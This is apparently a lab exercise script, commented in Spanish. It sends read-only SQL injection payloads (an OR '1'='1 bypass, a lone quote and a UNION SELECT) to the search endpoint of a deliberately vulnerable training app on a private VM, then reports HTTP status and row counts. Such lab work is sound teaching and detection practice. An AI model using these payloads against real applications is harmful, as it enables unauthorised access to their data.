#!/usr/bin/env python3
"""SQLi de solo lectura contra Canario, solo en modo laboratorio vulnerable.

Envía payloads SELECT/OR y UNION SELECT contra /api/v1/talent/search con
__lab=sqli. No usa DROP/UPDATE/DELETE ni modifica datos. El modo vulnerable
debe habilitarlo el instructor en la VM; el script no cambia la configuración.
"""
from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

from common import vm_ip

PAYLOADS = [
    ("bypass", "' OR '1'='1"),
    ("syntax", "'"),
    ("union", "' UNION SELECT id,name FROM talent_public -- "),
]


def request(url: str) -> tuple[int, bytes]:
    try:
        with urllib.request.urlopen(url, timeout=6) as response:
            return response.status, response.read(4096)
    except urllib.error.HTTPError as error:
        return error.code, error.read(4096)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--ip", default=None, help="IP privada de la VM (o LAB_VM_IP)")
    parser.add_argument("--port", type=int, default=8083)
    parser.add_argument("--payload", choices=[name for name, _ in PAYLOADS], default="all")
    args = parser.parse_args()
    ip = vm_ip(args.ip)
    base = f"http://{ip}:{args.port}/api/v1/talent/search"
    print(f"Objetivo Canario: {base} · modo laboratorio vulnerable requerido")
    print("SQLi de solo lectura; no se modifican datos.\n")

    selected = PAYLOADS if args.payload == "all" else [item for item in PAYLOADS if item[0] == args.payload]
    for name, payload in selected:
        url = base + "?" + urllib.parse.urlencode({"__lab": "sqli", "q": payload})
        status, body = request(url)
        count = None
        try:
            data = json.loads(body)
            if isinstance(data, dict) and isinstance(data.get("items"), list):
                count = len(data["items"])
        except json.JSONDecodeError:
            pass
        detail = f" · {count} fila(s) devueltas" if count is not None else ""
        print(f"{name:7s} · HTTP {status}{detail}")
    print("\nEsperado con el laboratorio vulnerable: bypass 200, syntax 500, union 500.")
    print("Si ves 502/404, Canario está en modo seguro o no arrancó; revisá el estado del servicio.")
    print("En Sentinel revisá Nginx/Node; la SQLi no se escribe en mysql/error.log.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
